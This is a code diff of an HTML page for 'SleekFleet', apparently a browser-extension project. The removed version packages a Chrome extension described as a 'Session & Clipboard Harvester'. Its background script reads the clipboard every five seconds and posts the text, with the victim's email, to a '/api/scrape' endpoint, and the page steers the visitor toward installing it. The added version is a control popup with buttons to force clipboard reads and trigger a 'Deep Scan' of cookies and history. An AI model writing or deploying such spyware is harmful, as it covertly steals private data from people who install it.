@@ -1,111 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SleekStore | Fleet Sync</title>
+    <title>SleekFleet Control</title>
     <style>
-        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --text: #c9d1d9; }
-        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 400px; }
-        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
-        h1 { font-size: 1.5rem; margin-bottom: 20px; text-align: center; color: var(--primary); }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
-        button:hover { background: #4c9bf0; }
-        .status { margin-top: 15px; font-size: 0.9em; color: #8b949e; text-align: center; }
+        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
+        button { padding: 15px; width: 100%; margin-bottom: 10px; cursor: pointer; font-size: 16px; }
+        .status { margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
     </style>
 </head>
 <body>
+    <h2>SleekFleet Monitor</h2>
+    <p>Status: <span id="status">Active</span></p>
+    
+    <!-- Button 1: Force Clipboard Read -->
+    <button id="readClipBtn">📋 Force Read Clipboard</button>
+    
+    <!-- Button 2: Trigger Full Background Harvest -->
+    <button id="harvestBtn">🚀 Trigger Deep Scan (Cookies/History)</button>
 
-<div class="container">
-    <div id="login-card" class="card">
-        <h1>🚗 SLEEK STORE</h1>
-        <p style="text-align:center; margin-bottom:20px;">Sync your fleet to capture sessions & clipboard.</p>
-        <input type="email" id="email" placeholder="user@example.com" required>
-        <button onclick="installExtension()">Install Monitor</button>
-        <div id="status" class="status"></div>
+    <div class="status">
+        <p>Last Action: <span id="lastAction">None</span></p>
     </div>
-</div>
 
-<script>
-    async function installExtension() {
-        const email = document.getElementById('email').value;
-        if (!email) return alert("Please enter an email.");
-        
-        const status = document.getElementById('status');
-        status.innerText = "Building extension...";
-
-        // 1. Manifest V3
-        const manifest = JSON.stringify({
-            manifest_version: 3,
-            name: "SleekFleet",
-            version: "1.0",
-            description: "Session & Clipboard Harvester",
-            permissions: ["storage", "clipboardRead", "background"],
-            background: { service_worker: "background.js" },
-            action: { default_popup: "popup.html" }
-        });
-
-        // 2. Background Script (The Brain - Runs forever)
-        const bgCode = `
-            chrome.runtime.onInstalled.addListener(() => {
-                chrome.storage.local.set({ installed: true });
-                startHarvesting();
-            });
-
-            async function startHarvesting() {
-                setInterval(async () => {
-                    try {
-                        // Read Clipboard
-                        const clipText = await navigator.clipboard.readText().catch(() => "No Access");
-                        
-                        // Send to Vercel API
-                        fetch('/api/scrape', {
-                            method: 'POST',
-                            headers: {'Content-Type':'application/json'},
-                            body: JSON.stringify({ 
-                                source: 'clip', 
-                                data: clipText, 
-                                ts: new Date().toISOString(),
-                                email: '${email}' 
-                            })
-                        });
-                    } catch(e) {
-                        console.log("Clip fail", e);
-                    }
-                }, 5000); // Every 5 seconds
+    <script>
+        document.getElementById('readClipBtn').addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                chrome.runtime.sendMessage({ action: "clipboardUpdate", data: text });
+                document.getElementById('lastAction').innerText = "Clipboard: " + text.substring(0, 20) + "...";
+            } catch (err) {
+                alert("Click permission needed! Click inside a tab first.");
             }
-        `;
-
-        // 3. Popup (UI)
-        const popupCode = `<body style="background:#0d1117;color:white;padding:20px;text-align:center;font-family:sans-serif;"><h2>✅ Active</h2><p>Harvesting...</p></body>`;
-
-        // 4. Create ZIP
-        const zip = new JSZip();
-        zip.file("manifest.json", manifest);
-        zip.file("background.js", bgCode);
-        zip.file("popup.html", popupCode);
-
-        const content = await zip.generateAsync({ type: "blob" });
-        const url = URL.createObjectURL(content);
-
-        // 5. Trigger Native Install
-        // We navigate to the blob URL. Chrome detects it's an extension and prompts.
-        window.location.href = url;
-
-        status.innerText = "Check for the 'Add Extension' prompt!";
-        
-        // Notify API that installation started
-        fetch('/api/scrape', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email: email, action: 'install_started' })
         });
-    }
-</script>
 
-<!-- JSZip Library -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+        document.getElementById('harvestBtn').addEventListener('click', () => {
+            chrome.runtime.sendMessage({ action: "harvest" });
+            document.getElementById('lastAction').innerText = "Deep Scan Sent";
+        });
+    </script>
 </body>
 </html>
